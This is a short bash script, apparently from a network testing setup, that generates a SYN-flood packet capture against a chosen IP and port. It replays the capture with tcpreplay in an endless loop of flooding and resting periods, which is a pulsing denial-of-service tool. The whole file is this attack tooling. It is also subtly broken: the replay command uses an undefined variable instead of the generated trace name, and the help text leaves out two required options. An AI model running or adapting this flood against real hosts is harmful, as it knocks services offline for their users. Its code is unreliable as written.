#!/bin/bash

pktLen=100
while [ -n "$1" ]
do
    case "$1" in
        -m) rate=$2
            shift;; 
        -s) floodPeriod=$2
            shift;;
        -r) restPeriod=$2
            shift;;
        -i) interface=$2
            shift;;
        -l) pktLen=$2
            shift;;
        -a) dstIP=$2
            shift;;
        -p) dstPort=$2
            shift;;
        -h) echo "This script has the following opetions:"
            echo ""
            echo "    -m speed: the speed of floods in Mbps"
            echo "    -s time: the duration of flooding in seconds"
            echo "    -r time: the duration of rest time(not flooding) in seconds"
            echo "    -i eno1: the interface which the flooding traffic is sent from"
            echo "    -l length: the length of each pkt, by default is 100"
            exit;;
    esac
    shift
done

if [ -z "$rate" ] || [ -z "$floodPeriod" ] || [ -z "$restPeriod" ] || [ -z "$interface" ] || [ -z "$dstIP" ] || [ -z "$dstPort" ]
then
    echo "please input -m -s -r -i -a -p parameters"
    exit
fi

echo "1"
pktNum=$(echo "($rate * 10000 * $floodPeriod / 500000 + 1) * 500000" | bc)
traceName="SYN_flooding_${pktNum}_${pktLen}_${dstIP}_${dstPort}.pcap"
if [ ! -e $traceName ]
then
    echo "2"
    ./traceGen.py -n $pktNum -l $pktLen -a $dstIP -p $dstPort -o $traceName
fi
echo "3"
read

while true
do
    tcpreplay -M $rate -i $interface $filename &
    pid=$!
    sleep $floodPeriod
    kill -9 $pid
    sleep $restPeriod
done
